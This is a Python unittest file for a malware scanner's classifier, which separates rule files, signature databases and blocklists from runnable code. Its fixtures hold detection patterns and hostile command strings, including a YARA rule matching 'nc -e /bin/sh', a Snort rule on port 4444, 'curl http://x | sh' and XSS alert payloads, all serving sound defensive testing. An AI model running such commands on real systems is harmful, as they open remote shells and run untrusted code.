"""reference_files.py: rule files, signature databases and blocklists describe
threats; they do not carry them. Tested both ways, as FlatScan does for its
equivalent guard: a guard that misses a rule file leaves MalDet rating itself
High, and a guard that fires too eagerly would quietly excuse real malware.
Domains are invented, IPs are documentation ranges; nothing here is run.

    python3 -m unittest discover -s tests -t . -v
"""
import os
import shutil
import tempfile
import unittest

import ioc_extractor
import reference_files as ref
import scanner

YARA_RULE = 'rule detect_reverse_shell {\n  strings:\n    $a = "nc -e /bin/sh"\n  condition:\n    $a\n}\n'
YARA_RULE_NEXT_LINE_BRACE = 'rule Tool_X : FILE\n{\n\tstrings:\n\t\t$a = "VirtualAllocEx"\n\tcondition:\n\t\t$a\n}\n'
SIGMA = ("title: Suspicious PowerShell\nlogsource:\n  product: windows\n"
         "detection:\n  selection:\n    CommandLine|contains: 'IEX'\n  condition: selection\n")
SNORT = "".join(f'alert tcp any any -> any 4444 (msg:"shell {i}"; sid:{i};)\n' for i in range(3))
DOMAINS = [f"miner{i}.pool-example.invalid" for i in range(40)]


def kind(name, text):
    return ref.reference_kind("/" + name, text)


class RecognisedTests(unittest.TestCase):
    def test_yara_rule_files(self):
        self.assertEqual(kind("rules.yar", YARA_RULE), "rule file")
        self.assertEqual(kind("rules/forge/core.yar", YARA_RULE_NEXT_LINE_BRACE), "rule file")
        self.assertEqual(kind("sigs.yara", "/* header */\n" + YARA_RULE), "rule file")

    def test_sigma_and_snort(self):
        self.assertEqual(kind("rules/win/ps.yml", SIGMA), "rule file")
        self.assertEqual(kind("emerging.rules", SNORT), "rule file")

    def test_clamav_database_by_extension(self):
        for name in ("main.ndb", "x.hdb", "daily.ldb", "extra.hsb"):
            self.assertEqual(kind(name, None), "signature database", name)

    def test_blocklist_formats(self):
        hosts = "# hosts\n" + "".join(f"0.0.0.0 {d}\n" for d in DOMAINS)
        adblock = "[Adblock Plus 2.0]\n! Title: x\n" + "".join(f"||{d}^\n" for d in DOMAINS)
        plain = "".join(f"{d}\n" for d in DOMAINS)
        ips = "".join(f"198.51.100.{i}\n" for i in range(30))
        for name, text in (("hosts", hosts), ("filter.txt", adblock), ("list.txt", plain), ("ips.txt", ips)):
            self.assertEqual(kind(name, text), "blocklist", name)

    def test_blocklist_tolerates_a_few_odd_lines(self):
        text = "".join(f"||{d}^\n" for d in DOMAINS) + "something else entirely\n"
        self.assertEqual(kind("filter.txt", text), "blocklist")


class NotExcusedTests(unittest.TestCase):
    """Anything that can run is never a reference file, whatever it contains."""

    def test_code_containing_rules_is_not_a_rule_file(self):
        for name in ("scanner.py", "rules.js", "install.sh", "Module.psm1", "rules.php"):
            self.assertIsNone(kind(name, f'RULES = """\n{YARA_RULE}"""\n'), name)

    def test_code_full_of_domains_is_not_a_blocklist(self):
        self.assertIsNone(kind("miner.py", "".join(f"{d}\n" for d in DOMAINS)))

    def test_ordinary_data_files_are_not_rule_files(self):
        compose = "services:\n  web:\n    image: nginx\n    command: curl http://x | sh\n"
        self.assertIsNone(kind("docker-compose.yml", compose))
        self.assertIsNone(kind("notes.txt", "rule of thumb: never run curl | sh\n"))

    def test_short_lists_and_prose_are_not_blocklists(self):
        self.assertIsNone(kind("few.txt", "".join(f"{d}\n" for d in DOMAINS[:5])))
        self.assertIsNone(kind("readme.txt", "This tool connects to stratum+tcp://pool.\n" * 30))
        payloads = "".join(f"<script>alert({i})</script>\n" for i in range(40))
        self.assertIsNone(kind("xss-payloads.txt", payloads))

    def test_debugger_and_ida_files_are_not_signature_databases(self):
        self.assertIsNone(kind("app.pdb", None))
        self.assertIsNone(kind("sample.idb", None))


class FileReadingTests(unittest.TestCase):
    def setUp(self):
        self.root = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, self.root)

    def write(self, rel, data):
        full = os.path.join(self.root, rel.lstrip("/"))
        os.makedirs(os.path.dirname(full), exist_ok=True)
        with open(full, "wb") as handle:
            handle.write(data)

    def test_utf16_and_very_large_lists_are_recognised(self):
        self.write("/u16.txt", "".join(f"||{d}^\n" for d in DOMAINS).encode("utf-16"))
        big = "".join(f"||{d}^\n" for d in DOMAINS) * 120000      # ~4MB, over the 2MB text limit
        self.write("/big.txt", big.encode())
        self.assertEqual(ref.classify_files(self.root, ["/u16.txt", "/big.txt"]),
                         {"/u16.txt": "blocklist", "/big.txt": "blocklist"})

    def test_symlink_is_not_followed(self):
        outside = tempfile.NamedTemporaryFile("w", suffix=".yar", delete=False)
        outside.write(YARA_RULE)
        outside.close()
        self.addCleanup(os.unlink, outside.name)
        os.symlink(outside.name, os.path.join(self.root, "link.yar"))
        self.assertEqual(ref.classify_files(self.root, ["/link.yar"]), {})

    def test_mark_references_changes_only_plain_matches_in_reference_files(self):
        self.write("/rules.yar", YARA_RULE.encode())
        self.write("/drop.py", b"import os\n")

        def finding(tool, issue, filename, severity="high"):
            return {"tool": tool, "severity": severity, "issue_text": issue, "filename": filename,
                    "line_number": 0, "code_snippet": ""}
        in_rules = finding("yara", "YARA rule matched: detect_reverse_shell", "/rules.yar")
        clam_in_rules = finding("clamav", "ClamAV detected: Eicar", "/rules.yar")
        hidden = finding("yara", "Hidden payload: YARA rule matched: x", "/rules.yar")
        known = finding("threat_intel", "MalwareBazaar: listed", "/rules.yar")
        code = finding("yara", "YARA rule matched: detect_reverse_shell", "/drop.py")
        findings = [in_rules, clam_in_rules, hidden, known, code]
        self.assertEqual(ref.mark_references(self.root, findings), 2)
        for f in (in_rules, clam_in_rules):
            self.assertEqual((f["reference"], f["severity"]), ("rule file", "low"))
            self.assertTrue(f["issue_text"].startswith("Reference in a rule file, not code that runs: "))
        for f in (hidden, known, code):
            self.assertNotIn("reference", f)
            self.assertEqual(f["severity"], "high")


class ScoringTests(unittest.TestCase):
    def test_references_are_listed_but_weigh_nothing(self):
        real = {"tool": "yara", "severity": "high", "issue_text": "a", "filename": "/x.py", "p_real": 1.0}
        listed = {"tool": "yara", "severity": "low", "issue_text": "b", "filename": "/l.txt",
                  "p_real": 0.9, "reference": "blocklist"}
        many = [dict(listed) for _ in range(50)]
        scanner.weigh_references(many + [real])
        risk = scanner.calculate_category_risk(many + [real])["malicious_pattern"]
        self.assertEqual(risk["score"], 10)            # the one real high finding only
        self.assertEqual(risk["low"], 50)              # still counted on the report

    def test_reference_files_give_no_iocs(self):
        findings = [{"tool": "yara", "filename": "/l.txt", "reference": "blocklist"},
                    {"tool": "yara", "filename": "/x.py"}]
        self.assertEqual(ioc_extractor.flagged_paths(findings), ["/x.py"])


if __name__ == "__main__":
    unittest.main()
